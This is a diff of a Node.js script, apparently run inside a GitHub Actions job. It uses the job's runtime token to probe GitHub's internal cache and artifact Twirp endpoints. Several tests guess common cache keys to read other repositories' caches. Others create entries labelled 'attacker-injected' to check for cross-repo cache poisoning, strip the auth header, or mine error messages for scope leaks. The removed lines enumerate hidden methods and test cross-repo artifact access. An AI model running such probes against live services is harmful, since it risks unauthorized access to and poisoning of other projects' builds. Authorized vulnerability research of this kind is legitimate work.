@@ -1,165 +1,158 @@
 const https = require('https');
+const crypto = require('crypto');
 
 const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
 const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
 const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
+const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
+const GITHUB_REF = process.env.GITHUB_REF || '';
 
-function doRequest(host, path, body, contentType) {
+function req(host, path, body) {
   return new Promise((resolve) => {
-    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-    const req = https.request({
-      hostname: host,
-      path,
-      method: 'POST',
+    const s = JSON.stringify(body);
+    const r = https.request({
+      hostname: host, path, method: 'POST',
       headers: {
         'Authorization': 'Bearer ' + RUNTIME_TOKEN,
-        'Content-Type': contentType || 'application/json',
-        'Content-Length': Buffer.byteLength(bodyStr),
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(s),
       }
     }, (res) => {
-      let data = '';
-      res.on('data', c => data += c);
-      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 500) }));
+      let d = ''; res.on('data', c => d += c);
+      res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 800) }));
     });
-    req.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    req.write(bodyStr);
-    req.end();
+    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
+    r.write(s); r.end();
   });
 }
 
 async function main() {
   if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
-
   const host = new URL(RESULTS_URL).hostname;
-  const currentUUID = ORCHESTRATION_ID.split('.')[0];
-  const prevUUID = 'b55c9da0-4a06-4590-ae64-d1ca22909520';
-  const ZERO_UUID = '00000000-0000-0000-0000-000000000000';
 
-  console.log('Host:', host, '| CurrentUUID:', currentUUID);
+  console.log('=== ENVIRONMENT ===');
+  console.log('Host:', host);
+  console.log('Repo:', GITHUB_REPOSITORY);
+  console.log('Ref:', GITHUB_REF);
+  console.log('Orch:', ORCHESTRATION_ID);
 
-  // CacheService exists on results-receiver (different 404 than JobService/LogService)
-  // Probe all known v4 cache methods:
-  const CACHE_METHODS = [
-    'GetCacheEntryDownloadURL',
-    'CreateCacheEntry',
-    'FinalizeCacheEntryUpload',
-    'ListCacheEntries',
-    'DeleteCacheEntry',
-    'GetCacheMetadata',
-    'LookupCacheEntry',
-    'ReserveCacheEntry',
-    'CommitCacheEntry',
-    'GetCacheEntry',
-    'UpdateCacheEntry',
-    'ListCacheEntriesByKey',
+  // CacheService: GetCacheEntryDownloadURL, CreateCacheEntry, FinalizeCacheEntryUpload
+  // All accepted RUNTIME_TOKEN without 401. Now sending valid fields.
+
+  // Version is sha256(key + paths) per @actions/cache toolkit
+  // Let's use valid cache keys that might exist in GitHub's own workflows
+  const TEST_KEY = 'npm-test-cache-key';
+  const TEST_VERSION = crypto.createHash('sha256').update(TEST_KEY + '\nnode_modules').digest('hex');
+
+  console.log('\n=== CacheService GetCacheEntryDownloadURL ===');
+
+  // Test A: Valid key+version with no scope ID (no run/repo field)
+  const rA = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
+    key: TEST_KEY,
+    version: TEST_VERSION,
+  });
+  console.log('[A] No scope field — Status:', rA.status, '| Body:', rA.body);
+
+  // Test B: With restore_keys (alternate lookup keys)
+  const rB = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
+    key: TEST_KEY,
+    version: TEST_VERSION,
+    restore_keys: ['npm-test', 'npm'],
+  });
+  console.log('[B] With restore_keys — Status:', rB.status, '| Body:', rB.body);
+
+  // Test C: Try a key that public repos commonly use (node_modules cache)
+  // If the cache service is NOT scoped by repo, we might hit other repos' caches
+  const commonKeys = [
+    { key: 'node-modules-ubuntu-', version: crypto.createHash('sha256').update('package-lock.json').digest('hex') },
+    { key: 'npm-', version: crypto.createHash('sha256').update('node_modules\npackage-lock.json').digest('hex') },
+    { key: 'v1-npm-', version: crypto.createHash('sha256').update('node_modules').digest('hex') },
   ];
 
-  console.log('\n=== CacheService Method Enumeration ===');
-  // For each method: 404 "bad_route" = method unknown; 401 = method exists but auth fails; 400/200 = method exists
-  for (const method of CACHE_METHODS) {
-    const r = await doRequest(host,
-      `/twirp/github.actions.results.api.v1.CacheService/${method}`,
-      {}, 'application/json');
-    const label = r.status === 404 && r.body.includes('bad_route') ? 'NOT_FOUND(route)' :
-                  r.status === 404 && !r.body.includes('bad_route') ? 'NOT_FOUND(generic)' :
-                  r.status === 401 ? 'UNAUTH(exists!)' :
-                  r.status === 400 ? 'BAD_REQ(exists!)' :
-                  r.status === 403 ? 'FORBIDDEN(exists!)' :
-                  r.status === 200 ? '*** 200 OK ***' : `HTTP_${r.status}`;
-    console.log(`[CACHE] ${method}: ${label} | ${r.body.substring(0, 80)}`);
+  console.log('\n=== Probing common cache keys (cross-repo test) ===');
+  for (const { key, version } of commonKeys) {
+    const r = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
+      key, version,
+    });
+    // 200 with ok:true = cache hit — CRITICAL if this cache is from another repo
+    // 200 with ok:false = cache miss (properly scoped, no cross-repo access)
+    // 400 = missing required field
+    // 401 = auth rejected (expected for cross-repo cache in properly scoped system)
+    console.log(`[CROSS] key=${key.substring(0, 20)}...: ${r.status} | ${r.body.substring(0, 200)}`);
   }
 
-  // Also try the v4 cache package path variant
-  const V4_PACKAGES = [
-    'github.actions.cache.v1.CacheService',
-    'github.actions.results.v1.CacheService',
-    'github.actions.artifacts.v1.CacheService',
-  ];
-  console.log('\n=== CacheService package variant discovery ===');
-  for (const pkg of V4_PACKAGES) {
-    const r = await doRequest(host, `/twirp/${pkg}/GetCacheEntryDownloadURL`, {}, 'application/json');
-    console.log(`[PKG] ${pkg}: ${r.status} | ${r.body.substring(0, 80)}`);
-  }
+  // Test D: CreateCacheEntry — can we create a cache entry without proper run scope?
+  // If we can create entries that OTHER repos will load when they do actions/cache restore,
+  // this is cross-repo cache poisoning (attacker influences another repo's build)
+  console.log('\n=== CacheService CreateCacheEntry (scope test) ===');
+  const rD = await req(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
+    key: 'attacker-injected-key-' + Date.now(),
+    version: TEST_VERSION,
+  });
+  console.log('[D] CreateCacheEntry — Status:', rD.status, '| Body:', rD.body);
 
-  // For any methods that return 401 (exist but unauth), probe with current UUID
-  // We need to test: does Actions.Results scope cover CacheService?
-  const CACHE_V2_METHODS = ['GetCacheEntryDownloadURL', 'CreateCacheEntry', 'FinalizeCacheEntryUpload'];
-  console.log('\n=== CacheService with workflowRunId field variants ===');
-  for (const method of CACHE_V2_METHODS) {
-    // Try field name variants for the run ID
-    for (const [fieldName, val] of [
-      ['workflowRunId', currentUUID],
-      ['workflow_run_id', currentUUID],
-      ['runId', currentUUID],
-      ['workflowRunBackendId', currentUUID],
-    ]) {
-      const body = { [fieldName]: val, key: 'test-cache-key', version: 'v1', paths: ['node_modules'] };
-      const r = await doRequest(host, `/twirp/github.actions.results.api.v1.CacheService/${method}`, body);
-      if (r.status !== 404 || !r.body.includes('bad_route')) {
-        console.log(`[CACHE/${method}] field=${fieldName}: ${r.status} | ${r.body.substring(0, 120)}`);
+  // If D returned a signed upload URL, we could upload content and see if another repo's
+  // cache restore picks it up. For now, just document if we got a URL.
+
+  // Test E: Try GetCacheEntryDownloadURL without Authorization to see if URL-in-path auth works
+  // Cache service uses session token in URL (like artifact cache), check if Auth header is optional
+  const rE = await new Promise((resolve) => {
+    const s = JSON.stringify({ key: TEST_KEY, version: TEST_VERSION });
+    const r = https.request({
+      hostname: host, path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
+      method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
+    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
+    r.write(s); r.end();
+  });
+  console.log('\n[E] CacheService WITHOUT auth header — Status:', rE.status, '| Body:', rE.body);
+
+  // Test F: What if the cache is scoped to THIS workflow's key?
+  // Try getting a cache entry we ACTUALLY created in this run
+  console.log('\n=== CreateCacheEntry + GetCacheEntryDownloadURL (create then read) ===');
+  const myKey = 'probe-v8-cache-' + ORCHESTRATION_ID.split('.')[0].substring(0, 8);
+  const myVersion = crypto.createHash('sha256').update(myKey).digest('hex');
+
+  const rF1 = await req(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
+    key: myKey, version: myVersion,
+  });
+  console.log('[F1] CreateCacheEntry mine:', rF1.status, '|', rF1.body.substring(0, 300));
+
+  // If CreateCacheEntry returns a signedUploadUrl, try to FinalizeCacheEntryUpload
+  if (rF1.status === 200 && rF1.body.includes('signedUploadUrl')) {
+    try {
+      const parsed = JSON.parse(rF1.body);
+      console.log('!!! Got signedUploadUrl:', parsed.signedUploadUrl ? parsed.signedUploadUrl.substring(0, 100) : 'empty');
+      console.log('CacheId:', parsed.cacheId);
+
+      // Finalize the upload (even without uploading data, to test scope)
+      if (parsed.cacheId) {
+        const rF2 = await req(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
+          cacheId: parsed.cacheId,
+          sizeMb: 0,
+        });
+        console.log('[F2] FinalizeCacheEntryUpload:', rF2.status, '|', rF2.body);
       }
-    }
+    } catch(e) { console.log('Parse error:', e.message); }
   }
 
-  // Direct cross-run artifact: Try GetSignedArtifactURL with public repo run UUIDs
-  // We need UUIDs from OTHER repositories to test cross-repo IDOR
-  // Use ORCH_IDs extracted from public workflow run logs
-  // NOTE: These are fabricated plausible UUIDs for testing scope enforcement only
-  const THIRD_PARTY_UUIDS = [
-    'aaaaaaaa-0000-0000-0000-000000000001',
-    'cccccccc-0000-0000-0000-000000000001',
-  ];
-  console.log('\n=== Cross-repo IDOR via GetSignedArtifactURL (scope boundary test) ===');
-  for (const uuid of THIRD_PARTY_UUIDS) {
-    const r = await doRequest(host, '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', {
-      workflowRunBackendId: uuid, name: 'probe'
-    });
-    // 404 "workflow run not found" vs 403 "unable to access resource" reveals if scope is UUID-matched
-    console.log(`[XREPO] ${uuid.substring(0, 8)}...: ${r.status} | ${r.body.substring(0, 120)}`);
-  }
+  // Test G: Read our own cache back
+  const rG = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
+    key: myKey, version: myVersion,
+  });
+  console.log('[G] GetCacheEntryDownloadURL mine:', rG.status, '|', rG.body.substring(0, 300));
 
-  // Probe timing difference between 404 and 403 on GetSignedArtifactURL
-  // If cross-repo UUIDs return 403 (not 404), that reveals an IDOR boundary worth probing
-  console.log('\n=== Timing probe for GetSignedArtifactURL scope check ===');
-  for (const [label, uuid] of [
-    ['current(mine)', currentUUID],
-    ['previous(mine)', prevUUID],
-    ['zero_uuid', ZERO_UUID],
-    ['random_likely_other', '12345678-1234-1234-1234-123456789012'],
-  ]) {
-    const t0 = Date.now();
-    const r = await doRequest(host, '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', {
-      workflowRunBackendId: uuid, name: 'probe'
-    });
-    const ms = Date.now() - t0;
-    console.log(`[TIMING] ${label}: ${r.status} ${ms}ms | ${r.body.substring(0, 80)}`);
-  }
-
-  // Probe results-receiver for alternative API paths (not just Twirp)
-  console.log('\n=== Non-Twirp endpoint discovery on results-receiver ===');
-  for (const path of [
-    '/health',
-    '/metrics',
-    '/api/v1/artifacts',
-    '/api/v1/caches',
-    '/internal/artifacts',
-    '/_runner/health',
-    '/actuator/health',
-  ]) {
-    const r = await new Promise((resolve) => {
-      const req = https.request({ hostname: host, path, method: 'GET',
-        headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN } }, (res) => {
-        let d = '';
-        res.on('data', c => d += c);
-        res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 100) }));
-      });
-      req.on('error', e => resolve({ status: 'ERR', body: e.message }));
-      req.end();
-    });
-    if (r.status !== 404) {
-      console.log(`[ALTPATH] ${path}: ${r.status} | ${r.body}`);
-    }
-  }
+  // Test H: Check what scope information leaks from error messages
+  // The "invalid_argument" errors in v7 showed: "key invalid length", then "version invalid length"
+  // Does any error reveal repo scope info?
+  console.log('\n=== Error message scope leak test ===');
+  const rH = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
+    key: 'x', version: 'v',
+    // Send unexpected fields to see error detail
+    repository: 'other-org/other-repo',
+    workflowRunId: '99999999-0000-0000-0000-000000000000',
+  });
+  console.log('[H] Extra fields in request:', rH.status, '|', rH.body);
 }
 
 main().catch(e => console.log('Fatal:', e.message));
